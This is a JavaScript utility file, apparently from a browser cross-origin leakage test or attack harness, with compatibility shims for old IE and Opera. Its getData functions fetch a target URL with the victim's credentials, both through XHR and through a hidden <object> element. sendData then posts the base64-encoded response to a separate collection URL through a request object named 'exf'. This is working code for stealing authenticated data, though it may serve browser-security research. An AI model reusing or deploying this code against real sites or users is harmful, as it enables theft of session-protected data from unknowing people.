var CSShidden = 'visibility: hidden; width: 0; height: 0; border: 0; border: none;';

// Can't find base64 implementation that works on IE 9.0 (and earlier maybe?)
if (typeof btoa === 'undefined') {
	atob = function () {
		return "Can't find base64 implementation that works on IE";
	};
	btoa = function () {
		return 'Q2FuJ3QgZmluZCBiYXNlNjQgaW1wbGVtZW50YXRpb24gdGhhdCB3b3JrcyBvbiBJRQo=';
	};
}

// textContent on IE8 and earlier
// thanks to https://stackoverflow.com/a/35213210
if (Object.defineProperty
  && Object.getOwnPropertyDescriptor
  && Object.getOwnPropertyDescriptor(Element.prototype, "textContent")
  && !Object.getOwnPropertyDescriptor(Element.prototype, "textContent").get) {
  (function() {
    var innerText = Object.getOwnPropertyDescriptor(Element.prototype, "innerText");
    Object.defineProperty(Element.prototype, "textContent",
     {
       get: function() {
         return innerText.get.call(this);
       },
       set: function(s) {
         return innerText.set.call(this, s);
       }
     }
   );
  })();
}

function registerWinOnLoad(func) {
	// Not working in Opera 11.52
	// document.addEventListener("DOMContentLoaded", function (event) {
	// 	logToConsole('DOM loaded')
	// 	func();
	// });

	// Not working in Opera 10.10
	// document.onreadystatechange = function () {
	// 	logToConsole('Doc state is ' + document.readyState);
	// 	// interactive not triggering in Opera 11.52
	// 	if (document.readyState === 'complete') {
	// 		func();
	// 	}
	// };

	window.onload = function () {
		if (typeof document.readyState !== 'undefined') {
			logToConsole('Doc state is ' + document.readyState);
		}
		else {
			logToConsole('Doc state is undefined');
		}
		// interactive not triggering in Opera 11.52
		if (typeof document.readyState === 'undefined' || document.readyState === 'complete') {
			func();
		}
	};
};

function registerOnLoad(obj, func) {
	if(obj.attachEvent) { // IE
		obj.attachEvent('onload', func);
	} else {
		obj.onload = func;
	}
};

function addElement(tag, attr, appendTo) {
	var el = document.createElement(tag);
	for (var prop in attr) {
		if (attr.hasOwnProperty(prop)) {
			el.setAttribute(prop, attr[prop]);
		}
	}
	if (typeof appendTo === 'undefined') {
		appendTo = document.body;
	}
	appendTo.appendChild(el);
	return el;
};

function getPar(parname) {
	var pars = window.location.search.slice(1).split('&');
	for (var i = 0; i < pars.length; i++){
		if (pars[i].substr(0, parname.length + 1) === parname + '=') {
			return pars[i].slice(parname.length + 1);
		}
	}
};

function logToPage(msg, msgStyle, divStyle, logId, quiet) {
	if (typeof logId === 'undefined') {
		logId = 'log';
	}
	if (typeof msgStyle === 'undefined') {
		msgStyle = 'font-family: monospace';
	}
	if (typeof divStyle === 'undefined') {
		divStyle = '';
	}
	var log = document.getElementById(logId);
	if (log === null) {
		log = addElement('div', {id: logId, style: divStyle})

		if (typeof quiet === 'undefined' || ! quiet) {
			logToConsole('Created log div');
		}
	}
	else if (typeof quiet === 'undefined' || ! quiet) {
		logToConsole('Using old log div');
	}
	var newlog = addElement('p', {
			style: 'margin-top: 0px; margin-bottom: 0px; ' + msgStyle}, log);
	newlog.textContent = msg;
};

function logToConsole(msg) {
	if (typeof DEBUG === 'undefined' || ! DEBUG) { return; }
	// There's no console in Opera 10.10 and IE
	// if (typeof console === 'undefined') {
		window.top.logToPage('[' + window.location.search + ']: ' + msg, '',
			'font-family: monospace; color: white; background-color: red;', 'errLog', true)
	// }
	// else {
	//	console.log(msg);
	// }
};

function getData(reqURL, reqViaPOST, sendURL, custom_header) {
	getDataViaXHR(reqURL, reqViaPOST, sendURL, custom_header);
	if (! reqViaPOST) {
		getDataViaCanvas(reqURL, sendURL);
	}
};

function getDataViaCanvas(reqURL, sendURL) {
	var img = addElement('object', {data: reqURL, crossOrigin: 'Anonymous',
		type: 'image/svg+xml', style: CSShidden});
	registerOnLoad(img, function () {
		// the onload handler of <object> fires too soon so we call it from setTimeout
		// IE11 doesn't support arrow functions, so we need to use bind
		sendDataLater = (function () {
			if (this.contentDocument) {
				sendData(this.contentDocument.body.childNodes[0].innerHTML, sendURL);
			} }).bind(this);
		setTimeout(sendDataLater, 2000);
	});
};

function getDataViaXHR(reqURL, reqViaPOST, sendURL, custom_header) {
	var req = new XMLHttpRequest();
	if (reqViaPOST) {
		logToPage('POSTing to ' + reqURL);
		req.open('POST', reqURL);
		req.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
	} else {
		logToPage('GETting ' + reqURL);
		req.open('GET', reqURL);
	}
	req.withCredentials = true;
	if (custom_header) {
		// should force preflight and fail if header is not allowed
		req.setRequestHeader(custom_header, 'Custom header');
	}
	req.onreadystatechange = function (){
		if (this.readyState != 4) { return; }
		logToPage(this.responseText, 'color: red; font-weight: bold');
		sendData(this.responseText, sendURL);
	};
	if (reqViaPOST) {
		req.send("{}"); // old browsers don't support JSON
	} else {
		req.send();
	}
};

function sendData(data, sendURL) {
	if (! data || ! sendURL) { return; }
	var exf = new XMLHttpRequest();
	exf.open('POST', sendURL);
	exf.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
	exf.send('{"data":"' + btoa(escape(data)) + '"}');
};
